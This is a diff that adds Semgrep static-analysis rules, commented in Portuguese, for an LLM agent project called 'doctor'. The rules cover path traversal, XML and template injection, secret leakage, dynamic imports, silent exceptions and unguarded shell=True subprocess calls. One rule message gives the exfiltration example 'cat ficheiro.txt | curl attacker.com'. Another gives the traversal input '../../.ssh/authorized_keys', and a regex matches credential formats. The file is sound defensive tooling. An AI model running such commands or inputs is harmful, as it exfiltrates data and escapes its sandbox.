@@ -1,0 +1,295 @@
+rules:
+
+  # ---------------------------------------------------------------------------
+  # RULE 1: Path Traversal — write_file / read_file tool
+  # O input `path` chega do LLM. Se contiver "../" é possível escrever/ler
+  # fora de ~/doctor-work. A verificação deve ser feita com Path.resolve()
+  # antes de qualquer open().
+  # Referência: OWASP A01:2021 — Broken Access Control (Path Traversal)
+  # ---------------------------------------------------------------------------
+  - id: doctor-path-traversal-write-file
+    patterns:
+      - pattern: |
+          path = Path(...)
+          ...
+          with open($PATH, ...) as $F:
+            $F.write(...)
+      - pattern-not: |
+          path = Path(...)
+          ...
+          $RESOLVED = $PATH.resolve()
+          ...
+          if not str($RESOLVED).startswith(str($BASE)):
+            ...
+    message: >
+      [doctor/path-traversal] write_file/read_file abre um ficheiro sem
+      verificar se o caminho resolvido permanece dentro do directório base
+      (work_dir). Um input como "../../.ssh/authorized_keys" escapa ao sandbox.
+      Corrigir com: full_path = (work_dir / path).resolve(); assert
+      str(full_path).startswith(str(work_dir.resolve())).
+    languages: [python]
+    severity: ERROR
+    paths:
+      include:
+        - "doctor/core/tools.py"
+
+  # ---------------------------------------------------------------------------
+  # RULE 2: Path Traversal — padrão genérico "../" em tool inputs
+  # Detecta qualquer lugar onde um path vem de inp.get() e é passado a open()
+  # ou Path() sem sanitização explícita.
+  # ---------------------------------------------------------------------------
+  - id: doctor-path-traversal-tool-input
+    patterns:
+      - pattern: |
+          $PATH = $INP.get(...)
+          ...
+          open($PATH, ...)
+      - pattern-not: |
+          $PATH = $INP.get(...)
+          ...
+          if ".." in $PATH:
+            ...
+    message: >
+      [doctor/path-traversal] Caminho obtido de tool input passado directamente
+      a open() sem verificação de travessal ("../"). Validar que o path
+      resolvido está dentro do directório de trabalho autorizado.
+    languages: [python]
+    severity: ERROR
+    paths:
+      include:
+        - "doctor/core/tools.py"
+        - "doctor/skills/"
+
+  # ---------------------------------------------------------------------------
+  # RULE 3: XML Injection via python-docx
+  # python-docx insere texto em XML interno. Se o input contiver tags XML/OOXML
+  # (<w:r>, entidades, etc.) pode corromper o documento ou injectar conteúdo.
+  # Inputs de utilizador devem ser passados por uma função de escape antes de
+  # qualquer método add_paragraph() / add_run() que receba strings arbitrárias.
+  # Referência: CWE-91 XML Injection
+  # ---------------------------------------------------------------------------
+  - id: doctor-xml-injection-docx
+    patterns:
+      - pattern: |
+          $DOC.add_paragraph($INPUT)
+      - pattern-not: |
+          $DOC.add_paragraph($ESCAPED)
+    message: >
+      [doctor/xml-injection] add_paragraph() recebe input sem validação explícita.
+      python-docx não faz escape automático de caracteres XML especiais em todos
+      os contextos. Garantir que o input não contém tags XML/OOXML antes de
+      inserir em documentos. Usar uma função de sanitização que remova ou escape
+      <, >, &, " antes da chamada.
+    languages: [python]
+    severity: WARNING
+    paths:
+      include:
+        - "doctor/skills/"
+        - "doctor/core/"
+
+  - id: doctor-xml-injection-docx-run
+    patterns:
+      - pattern: |
+          $RUN = $PARA.add_run($INPUT)
+    message: >
+      [doctor/xml-injection] add_run() recebe input possivelmente não sanitizado.
+      Verificar que $INPUT não contém caracteres XML especiais (<, >, &, ").
+    languages: [python]
+    severity: WARNING
+    paths:
+      include:
+        - "doctor/skills/"
+        - "doctor/core/"
+
+  # ---------------------------------------------------------------------------
+  # RULE 4: Template Injection — Jinja2 com autoescape desactivado
+  # Se o Doctor usar Jinja2 para gerar LaTeX ou HTML a partir de inputs do
+  # utilizador/LLM, autoescape=False permite injecção de código.
+  # Referência: OWASP A03:2021 — Injection (SSTI)
+  # ---------------------------------------------------------------------------
+  - id: doctor-jinja2-autoescape-disabled
+    patterns:
+      - pattern: |
+          jinja2.Environment(autoescape=False, ...)
+      - pattern: |
+          jinja2.Environment(..., autoescape=False)
+      - pattern: |
+          Environment(autoescape=False, ...)
+      - pattern: |
+          Environment(..., autoescape=False)
+    message: >
+      [doctor/template-injection] Jinja2 Environment criado com autoescape=False.
+      Se templates recebem input de utilizador ou do LLM, isto permite Server-Side
+      Template Injection. Usar autoescape=True ou jinja2.select_autoescape().
+      Para LaTeX: usar um escaper customizado para caracteres LaTeX especiais
+      em vez de desactivar o autoescape.
+    languages: [python]
+    severity: ERROR
+
+  - id: doctor-jinja2-from-string-user-input
+    patterns:
+      - pattern: |
+          $ENV.from_string($INPUT)
+    message: >
+      [doctor/template-injection] from_string() com input não literal.
+      Se $INPUT vier do utilizador ou do LLM, é injecção de template directa.
+      Templates devem vir de ficheiros estáticos (get_template()), nunca de
+      strings controladas pelo utilizador.
+    languages: [python]
+    severity: ERROR
+
+  # ---------------------------------------------------------------------------
+  # RULE 5: Secrets em outputs gerados (write_file)
+  # O Doctor escreve ficheiros com conteúdo gerado pelo LLM. Se o LLM "alucinr"
+  # um API key real ou se um secret do ambiente vazar para o conteúdo, ficará
+  # escrito em disco num ficheiro potencialmente rastreado pelo git.
+  # Esta regra detecta padrões de secret em strings literais passadas a write().
+  # Para secrets dinâmicos, usar gitleaks no pre-commit sobre os outputs.
+  # Referência: OWASP A02:2021 — Cryptographic Failures
+  # ---------------------------------------------------------------------------
+  - id: doctor-secret-in-write-output
+    patterns:
+      - pattern: |
+          $F.write($CONTENT)
+      - metavariable-regex:
+          metavariable: $CONTENT
+          regex: '(?i)(api[_-]?key|secret[_-]?key|access[_-]?token|sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16})'
+    message: >
+      [doctor/secret-in-output] Possível secret detectado em conteúdo a ser
+      escrito em ficheiro. Verificar se $CONTENT contém credenciais reais antes
+      de persistir. API keys e tokens nunca devem aparecer em ficheiros de output.
+    languages: [python]
+    severity: WARNING
+    paths:
+      include:
+        - "doctor/core/tools.py"
+
+  # ---------------------------------------------------------------------------
+  # RULE 7: A03:2025 — Supply Chain — importações dinâmicas com strings não-literais
+  # __import__ e importlib.import_module com variáveis permitem carregar código
+  # arbitrário se a string vier de input não confiável (LLM output, ficheiro externo).
+  # Referência: OWASP A03:2025 — Supply Chain / Injection
+  # ---------------------------------------------------------------------------
+  - id: doctor-dynamic-import-non-literal
+    patterns:
+      - pattern: __import__($VAR)
+      - pattern-not: __import__("...")
+    message: >
+      [doctor/supply-chain] __import__() com argumento variável. Se $VAR for
+      controlável por input externo (LLM, utilizador), permite carregamento
+      de módulos arbitrários. Usar importações estáticas ou validar $VAR
+      contra uma allowlist de módulos conhecidos antes de importar.
+    languages: [python]
+    severity: ERROR
+
+  - id: doctor-importlib-non-literal
+    patterns:
+      - pattern: importlib.import_module($VAR)
+      - pattern-not: importlib.import_module("...")
+    message: >
+      [doctor/supply-chain] importlib.import_module() com argumento variável.
+      Se $VAR vem de input não confiável, é injecção de código via supply chain.
+      Validar $VAR contra allowlist antes de importar.
+    languages: [python]
+    severity: ERROR
+
+  # ---------------------------------------------------------------------------
+  # RULE 8: A10:2025 — Exception Handling — except sem logging
+  # O Doctor usa "except Exception as e: return f'Erro...'" em vários tools.
+  # Silenciar excepções sem logging impede detecção de ataques e falhas.
+  # Referência: OWASP A10:2025 — Improper Exception and Error Handling
+  # ---------------------------------------------------------------------------
+  - id: doctor-except-without-logging
+    patterns:
+      - pattern: |
+          except $EXC as $E:
+            return $MSG
+      - pattern-not: |
+          except $EXC as $E:
+            ...
+            logging.$LEVEL(...)
+            ...
+            return $MSG
+      - pattern-not: |
+          except $EXC as $E:
+            ...
+            logger.$LEVEL(...)
+            ...
+            return $MSG
+    message: >
+      [doctor/exception-handling] except captura excepção mas retorna directamente
+      sem logging. Falhas silenciosas ocultam erros de segurança e bugs.
+      Adicionar: logger.warning("Erro em <contexto>: %s", $E) antes do return.
+      Referência: OWASP A10:2025 — Improper Exception and Error Handling.
+    languages: [python]
+    severity: WARNING
+    paths:
+      include:
+        - "doctor/core/tools.py"
+        - "doctor/skills/"
+        - "doctor/core/"
+
+  - id: doctor-bare-except
+    patterns:
+      - pattern: |
+          except:
+            ...
+    message: >
+      [doctor/exception-handling] bare except (sem tipo) captura SystemExit e
+      KeyboardInterrupt, impedindo terminação correcta do processo.
+      Usar sempre "except Exception:" ou tipos específicos.
+      Referência: OWASP A10:2025 — Improper Exception and Error Handling.
+    languages: [python]
+    severity: ERROR
+
+  # ---------------------------------------------------------------------------
+  # RULE 9: A03:2025 — subprocess com input que bypassa BLOCKED_COMMANDS
+  # O check actual usa command_lower mas não valida o working_dir nem detecta
+  # command chaining via pipes (cmd1 | cmd2) onde cmd2 pode ser perigoso.
+  # ---------------------------------------------------------------------------
+  - id: doctor-subprocess-pipe-bypass
+    patterns:
+      - pattern: |
+          subprocess.run($CMD, shell=True, ...)
+      - metavariable-regex:
+          metavariable: $CMD
+          regex: '.*\|.*'
+    message: >
+      [doctor/command-injection] subprocess.run com shell=True e pipe (|) no
+      comando. O segundo comando num pipe não é validado pelo prefixo allowlist.
+      Ex: "cat ficheiro.txt | curl attacker.com" passa o check de prefixo "cat"
+      mas exfiltra dados. Validar toda a string após normalização de pipes.
+    languages: [python]
+    severity: ERROR
+    paths:
+      include:
+        - "doctor/core/tools.py"
+
+  # ---------------------------------------------------------------------------
+  # RULE 6: subprocess com shell=True e input não filtrado
+  # _run_command usa shell=True com uma allowlist. Esta regra detecta qualquer
+  # novo uso de subprocess com shell=True fora do padrão existente (sem a
+  # verificação de BLOCKED_COMMANDS visível).
+  # Referência: CWE-78 OS Command Injection
+  # ---------------------------------------------------------------------------
+  - id: doctor-subprocess-shell-unguarded
+    patterns:
+      - pattern: |
+          subprocess.run($CMD, shell=True, ...)
+      - pattern-not: |
+          for $BLOCKED in BLOCKED_COMMANDS:
+            ...
+          ...
+          subprocess.run($CMD, shell=True, ...)
+    message: >
+      [doctor/command-injection] subprocess.run com shell=True sem verificação
+      visível contra BLOCKED_COMMANDS. Se $CMD contiver input do utilizador ou
+      do LLM, é injecção de comando. Garantir que a validação da allowlist
+      precede esta chamada, ou usar shell=False com lista de argumentos.
+    languages: [python]
+    severity: ERROR
+    paths:
+      include:
+        - "doctor/core/tools.py"
+        - "doctor/skills/"
+        - "scripts/"
